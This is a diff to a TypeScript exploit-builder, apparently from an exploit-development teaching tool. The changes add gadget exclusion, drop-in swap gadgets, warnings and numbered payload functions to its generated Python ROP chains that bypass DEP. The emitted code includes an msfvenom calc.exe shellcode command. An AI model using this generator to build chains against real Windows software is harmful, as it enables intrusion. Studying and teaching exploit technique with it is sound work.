@@ -2,7 +2,7 @@ import { CapabilityIndex } from "../rop/capabilities";
 import { rankCandidates } from "../rop/emitter";
 import { RopGadget } from "../rop/types";
 import { ValueRecipe } from "../rop/value_solver";
-import { DepPlanStyle, JobPlan, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, writtenRegisters } from "./dep_plan";
+import { DepPlanStyle, JobPlan, Verdict, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, writtenRegisters } from "./dep_plan";
 import { DepApi } from "./rop_template";
 
 // Where each argument of the call comes from. One list of slots per API serves both styles: the skeleton
@@ -74,7 +74,11 @@ const PUSHAD_TAIL: Record<DepApi, Slot[]> = {
 };
 
 // One row per gadget the chain uses. Every block is a rendering of this table.
-export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string };
+export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string; loads: number };
+
+/** A drop-in replacement for a chosen gadget: same job, same registers, no move needed. Its cost is in
+ * COST too, so swapping is moving the comment marker and nothing else. */
+export type Swap = { address: number; sequence: string; pops: number; retn: number; why: string };
 
 type Op = { call: Entry; values: string[]; times?: number } | { line: string };
 
@@ -87,17 +91,22 @@ export type BuildInput = {
   badchars: number[];
   index: CapabilityIndex | undefined;
   plans: JobPlan[];
+  /** Gadget addresses the chain must not use, from the exclude argument. */
+  exclude: number[];
   iatSlot?: number;
   writable?: number;
   cave?: number;
   jmpEsp?: number;
+  /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
+   * as that complete function, so his file grows by appending and every function is one thing he sends. */
+  stage: number;
   solve: (register: string, value: number, keep: string[]) => ValueRecipe | undefined;
 };
 
 // A section either has code to copy or a reason why it has none. There is no empty block.
 export type Block = { lines: string[] } | { none: string };
 
-export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; recipes: Recipe[] };
+export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; recipes: Recipe[]; stages: number[] };
 
 const JUNK = /^(junk|padding)/;
 const REGISTERS = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
@@ -185,7 +194,14 @@ export function slotBlock(api: DepApi, module: string, iatSlot: number | undefin
 
 export function buildExploit(input: BuildInput): Build {
   const { api, style, index, badchars } = input;
-  const gadgets = index?.gadgets ?? [];
+  // Numbers handed out within this run, so two emitted functions can never collide with each other.
+  const stages: number[] = [];
+  const nextStage = (): number => {
+    const number = input.stage + stages.length;
+    stages.push(number);
+    return number;
+  };
+  const gadgets = (index?.gadgets ?? []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
   const table: Entry[] = [];
   const holes: string[] = [];
   const recipes: Recipe[] = [];
@@ -193,15 +209,51 @@ export function buildExploit(input: BuildInput): Build {
   for (const gadget of gadgets) byAddress[gadgetAddress(gadget)] = gadget;
   const pick = (key: string): Verdict | undefined => input.plans.filter((plan) => plan.job.key === key)[0]?.pick;
 
-  const row = (address: number, text: string, job: string, pops = 0, retn = 0): Entry => {
+  // Alternatives that swap in by moving the comment marker: same job, same registers, no move needed,
+  // and nothing the chain cannot point anywhere. A candidate rejected for clobbering a live register is
+  // not a fallback, it is a trap, so it never appears here.
+  const swapsFor = (address: number, loads: number): Swap[] => {
+    const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
+    if (!plan || !plan.pick) return [];
+    const chosen = plan.pick;
+    // Drop-in means the chain's arithmetic does not move: the same operands, the same offset, and
+    // nothing running before the instruction that does the job. `mov [ecx+0x8]` is not a swap for
+    // `mov [ecx+0x20]`, it is a different chain.
+    const sameAt = (verdict: Verdict): boolean =>
+      verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source
+      && verdict.at.address === chosen.at.address && (verdict.at.offset ?? 0) === (chosen.at.offset ?? 0);
+    return plan.verdicts
+      .slice(plan.verdicts.indexOf(chosen) + 1)
+      .filter((verdict) => verdict.usable && !verdict.move && verdict.uncontrolled.length === 0
+        && verdict.leads && chosen.leads && sameAt(verdict)
+        && input.exclude.indexOf(gadgetAddress(verdict.gadget)) < 0)
+      .slice(0, 2)
+      .map((verdict) => ({
+        address: gadgetAddress(verdict.gadget),
+        sequence: sequence(verdict.gadget),
+        pops: extraPops(verdict.gadget, loads),
+        retn: lastRetN(verdict.gadget),
+        why: sideEffects(verdict.gadget, plan.job),
+      }));
+  };
+
+  // Carried into the emitted comment, not only into the evidence: the comment is what survives into his file.
+  const warnings: Record<number, string> = {};
+  for (const plan of input.plans) {
+    if (plan.pick && plan.pick.uncontrolled.length > 0) {
+      warnings[gadgetAddress(plan.pick.gadget)] = `reads through ${plan.pick.uncontrolled.join(", ")}, which nothing points anywhere: set ${plan.pick.uncontrolled.join(" and ")} first or it faults here`;
+    }
+  }
+
+  const row = (address: number, text: string, job: string, pops = 0, retn = 0, loads = 0): Entry => {
     const found = table.filter((entry) => entry.address === address)[0];
     if (found) return found;
-    const entry: Entry = { name: "", address, sequence: text, pops, retn, job };
+    const entry: Entry = { name: "", address, sequence: text, pops, retn, job, loads };
     table.push(entry);
     return entry;
   };
   const entry = (gadget: RopGadget, job: string, loads = 0): Entry =>
-    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget));
+    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, loads), lastRetN(gadget), loads);
 
   // Names exist only once the table is complete, so ops hold entries and lines hold tokens.
   const refs: Entry[] = [];
@@ -257,7 +309,14 @@ export function buildExploit(input: BuildInput): Build {
         if (!JUNK.test(recipe.steps[j].comment)) values.push(hex(recipe.steps[j].value ?? 0));
       }
       const gadget = byAddress[Number(step.address)];
-      ops.push({ call: gadget ? entry(gadget, job, values.length) : row(Number(step.address), step.comment, job), values });
+      // A recipe address the scan did not produce has no cost here, so its extra pops would go unpaid and
+      // the chain would derail silently. Say so in the file instead.
+      ops.push({
+        call: gadget
+          ? entry(gadget, job, values.length)
+          : row(Number(step.address), `${step.comment}   <<< not in the scanned corpus: check its extra pops and ret N by hand`, job),
+        values,
+      });
     });
     return ops;
   };
@@ -513,6 +572,7 @@ export function buildExploit(input: BuildInput): Build {
   const slot = slotBlock(api, input.module, input.iatSlot, badchars);
   return {
     table,
+    stages,
     holes: slot.hole ? [slot.hole, ...holes] : holes,
     recipes,
     blocks: {
@@ -520,8 +580,17 @@ export function buildExploit(input: BuildInput): Build {
       2: slot.block,
       3: CORPUS_BLOCK,
       4: { lines: [
-        ...table.map((entry) => `${entry.name.padEnd(width)} = ${hex(entry.address)}   # ${entry.sequence}`),
-        `COST = {${cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`).join(", ")}}     # (extra pops, ret N)`,
+        ...table.flatMap((entry) => [
+          `${entry.name.padEnd(width)} = ${hex(entry.address)}   # ${entry.sequence}${warnings[entry.address] ? `   <<< ${warnings[entry.address]}` : ""}`,
+          ...swapsFor(entry.address, entry.loads).map((swap) =>
+            `# ${entry.name.padEnd(width - 2)} = ${hex(swap.address)}   # ${swap.sequence}   drop-in swap, ranked lower: ${swap.why}`),
+        ]),
+        `COST = {${[
+          ...cost.map((entry) => `${entry.name}: (${entry.pops}, ${entry.retn ? `0x${entry.retn.toString(16)}` : 0})`),
+          ...table.flatMap((entry) => swapsFor(entry.address, entry.loads)
+            .filter((swap) => swap.pops > 0 || swap.retn > 0)
+            .map((swap) => `${hex(swap.address)}: (${swap.pops}, ${swap.retn ? `0x${swap.retn.toString(16)}` : 0})`)),
+        ].join(", ")}}     # (extra pops, ret N). The swap-ins are here too, so swapping one in needs no other edit.`,
         "",
         "class Chain(list):                # c.rop(gadget, values): the gadget, junk for the last ret N, its values, junk for its extra pops",
         "    skip, patches = 0, None",
@@ -537,13 +606,16 @@ export function buildExploit(input: BuildInput): Build {
       ] },
       6: { lines: frameBlock },
       7: { lines: [
-        "nops = b\"\\x90\" * 16",
-        ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
-        ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
-        "c = Chain()",
-        ...render(chain, ""),
-        "return payload",
-      ].map((line) => line === "" ? "" : `    ${line}`) },
+        `def payload${nextStage()}():`,
+        ...[
+          "nops = b\"\\x90\" * 16",
+          ...render(hole("shellcode", `msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -b "${badText}" -f python -v shellcode`), ""),
+          ...(sized ? ["size = len(nops + shellcode)", "while not clean(neg(size)): size += 1"] : []),
+          "c = Chain()",
+          ...render(chain, ""),
+          "return payload",
+        ].map((line) => (line === "" ? "" : `    ${line}`)),
+      ] },
     },
   };
 }
